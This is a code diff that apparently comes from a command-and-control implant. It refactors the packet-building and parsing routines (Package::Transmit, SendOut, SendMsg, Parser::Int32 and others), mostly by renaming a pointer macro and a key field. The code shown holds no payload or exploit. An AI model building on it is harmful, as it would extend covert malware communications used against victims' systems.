@@ -260,7 +260,7 @@ auto DECLFN Package::Int16(
     _In_ PPACKAGE Package, 
     _In_ INT16    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );
+    Package->Buffer = PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT16 ) ) );
 
     Int16ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );
 
@@ -272,7 +272,7 @@ auto DECLFN Package::Int32(
     _In_ PPACKAGE Package, 
     _In_ INT32    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );
+    Package->Buffer = PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + sizeof( INT32 ) ) );
 
     Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );
 
@@ -284,7 +284,7 @@ auto DECLFN Package::Int64(
     _In_ PPACKAGE Package, 
     _In_ INT64    dataInt 
 ) -> VOID {
-    Package->Buffer = C_PTR( Self->Hp->ReAlloc(
+    Package->Buffer = PTR( Self->Hp->ReAlloc(
         Package->Buffer,
         Package->Length + sizeof( INT64 )
     ));
@@ -329,7 +329,7 @@ auto DECLFN Package::PostJobs( VOID ) -> PACKAGE* {
     PACKAGE* Package = NULL;
 
     Package          = (PACKAGE*)Self->Hp->Alloc( sizeof( PACKAGE ) );
-    Package->Buffer  = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
+    Package->Buffer  = PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length  = 0;
     Package->Encrypt = FALSE;
 
@@ -345,7 +345,7 @@ auto DECLFN Package::NewTask(
     PPACKAGE Package = NULL;
 
     Package          = (PPACKAGE)Self->Hp->Alloc( sizeof( PACKAGE ) );
-    Package->Buffer  = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
+    Package->Buffer  = PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length  = 0;
     Package->Encrypt = FALSE;
 
@@ -397,7 +397,7 @@ auto DECLFN Package::Transmit(
     Mem::Copy( (PVOID)( (UPTR)( TmpBuff ) + 36 ), EncryptStart, EncryptLen );
 
     if ( ! Self->Session.Connected ) {
-        Mem::Copy( (PVOID)( (UPTR)( TmpBuff ) + ( TmpLen - sizeof( Self->Crp->Key ) ) ), Self->Crp->Key, sizeof( Self->Crp->Key ) );
+        Mem::Copy( (PVOID)( (UPTR)( TmpBuff ) + ( TmpLen - sizeof( Self->Crp->LokKey ) ) ), Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
     }
 
     PCHAR FinalPacket = this->Base64Enc( (const unsigned char*)TmpBuff, TmpLen );
@@ -456,7 +456,7 @@ auto DECLFN Package::Pad(
         Package->Length + Size
     ));
 
-    Mem::Copy( C_PTR( U_PTR( Package->Buffer ) + ( Package->Length ) ), C_PTR( Data ), Size );
+    Mem::Copy( PTR( U_PTR( Package->Buffer ) + ( Package->Length ) ), PTR( Data ), Size );
 
     Package->Size    = Package->Length;
     Package->Length += Size;
@@ -469,11 +469,11 @@ auto DECLFN Package::Bytes(
 ) -> VOID {
     this->Int32( Package, Size );
 
-    Package->Buffer = C_PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + Size ) );
+    Package->Buffer = PTR( Self->Hp->ReAlloc( Package->Buffer, Package->Length + Size ) );
 
     Int32ToBuffer( UC_PTR( U_PTR( Package->Buffer ) + ( Package->Length - sizeof( UINT32 ) ) ), Size );
 
-    Mem::Copy( C_PTR( U_PTR( Package->Buffer ) + Package->Length ), C_PTR( Data ), Size );
+    Mem::Copy( PTR( U_PTR( Package->Buffer ) + Package->Length ), PTR( Data ), Size );
 
     Package->Size   =   Package->Length;
     Package->Length +=  Size;
@@ -502,7 +502,7 @@ auto DECLFN Package::SendOut(
 ) -> BOOL {
     PACKAGE* Package = (PACKAGE*)Self->Hp->Alloc( sizeof( PACKAGE ) );
 
-    Package->Buffer = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
+    Package->Buffer = PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length = 0;
 
     this->Pad( Package, UC_PTR( Self->Session.AgentID ), 36 );
@@ -527,7 +527,7 @@ auto DECLFN Package::SendMsg(
 ) -> BOOL {
     PACKAGE* Package = (PACKAGE*)Self->Hp->Alloc( sizeof( PACKAGE ) );
 
-    Package->Buffer = C_PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
+    Package->Buffer = PTR( Self->Hp->Alloc( sizeof( BYTE ) ) );
     Package->Length = 0;
 
     this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
@@ -557,7 +557,7 @@ auto DECLFN Parser::New(
         return;
 
     parser->Original = A_PTR( Self->Hp->Alloc( size ) );
-    Mem::Copy( C_PTR( parser->Original ), C_PTR( Buffer ), size );
+    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
     parser->Buffer   = parser->Original;
     parser->Length   = size;
     parser->Size     = size;
@@ -572,7 +572,7 @@ auto DECLFN Parser::NewTask(
         return;
 
     parser->Original = A_PTR( Self->Hp->Alloc( size ) );
-    Mem::Copy( C_PTR( parser->Original ), C_PTR( Buffer ), size );
+    Mem::Copy( PTR( parser->Original ), PTR( Buffer ), size );
     parser->Buffer   = parser->Original;
     parser->Length   = size;
     parser->Size     = size;
@@ -606,7 +606,7 @@ auto DECLFN Parser::Int32(
     // if ( parser->Length < 4 )
         // return 0;
 
-    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 4 );
+    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 4 );
 
     parser->Buffer += 4;
     parser->Length -= 4;
@@ -627,7 +627,7 @@ auto DECLFN Parser::Bytes(
     if ( parser->Length < 4 || !parser->Buffer )
         return NULL;
 
-    Mem::Copy( C_PTR( &Length ), C_PTR( parser->Buffer ), 4 );
+    Mem::Copy( PTR( &Length ), PTR( parser->Buffer ), 4 );
     parser->Buffer += 4;
 
     if ( this->Endian )
@@ -686,7 +686,7 @@ auto DECLFN Parser::Int16(
     if ( parser->Length < 2 )
         return 0;
 
-    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 2 );
+    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 2 );
 
     parser->Buffer += 2;
     parser->Length -= 2;
@@ -708,7 +708,7 @@ auto DECLFN Parser::Int64(
     if ( parser->Length < 8 )
         return 0;
 
-    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 8 );
+    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 8 );
 
     parser->Buffer += 8;
     parser->Length -= 8;
@@ -727,7 +727,7 @@ auto DECLFN Parser::Byte(
     if ( parser->Length < 1 )
         return 0;
 
-    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 1 );
+    Mem::Copy( PTR( &intBytes ), PTR( parser->Buffer ), 1 );
 
     parser->Buffer += 1;
     parser->Length -= 1;
